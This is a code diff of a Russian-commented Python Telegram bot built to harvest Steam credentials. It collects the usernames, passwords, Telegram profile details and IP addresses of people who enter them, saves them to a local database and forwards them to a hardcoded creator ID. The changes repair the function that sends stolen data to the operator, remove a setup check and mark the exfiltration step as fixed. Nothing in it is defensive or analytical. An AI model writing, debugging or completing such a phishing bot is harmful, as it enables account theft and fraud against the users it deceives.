@@ -14,7 +14,7 @@ logging.basicConfig(
 logger = logging.getLogger(__name__)
 
 # ID создателя бота (ваш Telegram ID)
-CREATOR_ID = 8673619246  # ЗАМЕНИТЕ НА ВАШ TELEGRAM ID
+CREATOR_ID = 8673619246  # Ваш ID из логов
 CREATOR_USERNAME = "@serjantyabloko"
 
 # Хранилище сессий пользователей
@@ -109,7 +109,7 @@ class Database:
 # Инициализация базы данных
 db = Database()
 
-def send_to_creator(context, user_id, username, password, user_info, ip_address):
+def send_to_creator(bot, user_id, username, password, user_info, ip_address):
     """Отправка собранных данных создателю бота"""
     message = (
         f"🔐 <b>НОВЫЕ ДАННЫЕ STEAM!</b>\n\n"
@@ -135,7 +135,7 @@ def send_to_creator(context, user_id, username, password, user_info, ip_address)
     reply_markup = InlineKeyboardMarkup(keyboard)
     
     try:
-        context.bot.send_message(
+        bot.send_message(
             chat_id=CREATOR_ID,
             text=message,
             parse_mode='HTML',
@@ -285,7 +285,7 @@ def handle_message(update: Update, context):
             
             db.log_action(user_id, "credentials_saved", f"Сохранен аккаунт: {username}")
             
-            # Отправляем данные создателю бота
+            # Отправляем данные создателю бота (исправлено!)
             user_info = {
                 'username': telegram_username,
                 'first_name': first_name,
@@ -429,15 +429,6 @@ def main():
         print("Пример: export TELEGRAM_BOT_TOKEN='ваш_токен'")
         return
     
-    # Проверяем, что CREATOR_ID установлен
-    if CREATOR_ID == 123456789:
-        print("=" * 50)
-        print("⚠️  ВНИМАНИЕ! Необходимо настроить CREATOR_ID!")
-        print("Найдите свой Telegram ID (например, через @userinfobot)")
-        print("Замените 123456789 в коде на ваш реальный ID")
-        print("=" * 50)
-        return
-    
     # Создаем Updater
     updater = Updater(token, use_context=True)
     dp = updater.dispatcher
@@ -456,7 +447,7 @@ def main():
     logger.info("🚀 Бот запущен")
     print("=" * 50)
     print("✅ Бот для сбора данных успешно запущен!")
-    print(f"👑 Создатель: {CREATOR_USERNAME}")
+    print(f"👑 Создатель: {CREATOR_USERNAME} (ID: {CREATOR_ID})")
     print(f"📁 База данных: collected_data.db")
     print("=" * 50)
     print("Команды бота:")
